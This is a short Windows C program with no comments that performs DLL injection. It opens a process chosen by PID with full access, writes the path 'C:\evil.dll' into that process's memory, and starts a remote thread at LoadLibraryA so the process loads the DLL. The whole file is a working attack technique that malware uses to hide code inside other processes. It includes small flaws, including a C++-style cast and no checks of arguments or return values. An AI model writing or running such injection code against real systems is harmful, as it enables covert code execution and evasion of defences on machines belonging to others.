#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

char evilDLL[] = "C:\\evil.dll";

unsigned int evilLen = sizeof(evilDLL) + 1;

int main(int argc, char* argv[]){
    HANDLE ph;
    HANDLE rt;
    LPVOID rb;

    HMODULE hKernel32 = GetModuleHandle("Kernel32");
    FARPROC lb = GetProcAddress(hKernel32, "LoadLibraryA");

    if(atoi(argv[1]) == 0){
        printf("PID not found :( exiting...\n");
        return -1;
    }

    printf("PID : %i", atoi(argv[1]));
    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

    rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

    WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);

    rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
    CloseHandle(ph);
    return 0;
}